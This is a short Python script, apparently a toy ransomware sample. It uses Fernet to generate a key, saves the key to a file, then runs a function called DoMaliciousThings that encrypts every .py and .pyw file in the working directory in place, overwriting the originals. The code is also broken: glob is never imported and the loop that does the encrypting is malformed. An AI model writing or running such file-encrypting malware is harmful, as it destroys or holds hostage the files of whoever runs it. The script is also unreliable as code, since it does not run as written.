from cryptography.fernet import Fernet

def write_key():
    key = Fernet.generate_key()

    with open('mykey.key', 'wb') as mykey:
        mykey.write(key)

    print (key)


def load_key():
    return open ("mykey.key", "rb").read()

def encrypt(filename, key):
   
    f = Fernet(key)
    with open(filename, "rb") as file:
        # precteme vsechna data
        file_data = file.read()
    # zasifrujeme data
    encrypted_data = f.encrypt(file_data)
    # vytvorime novy zasifrovany soubor
    with open(filename, "wb") as file:
        file.write(encrypted_data)


def decrypt(filename, key):
    
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read the encrypted data
        encrypted_data = file.read()
    # decrypt data
        decrypted_data = f.decrypt(encrypted_data)
    # write the original file
    with open(filename, "wb") as file:
        file.write(decrypted_data)

def DoMaliciousThings():
    for file in glob.glob('*.py') + glob.glob('*.pyw')
    encrypt(file,key)


write_key()
key = load_key()
DoMaliciousThings()


    

    
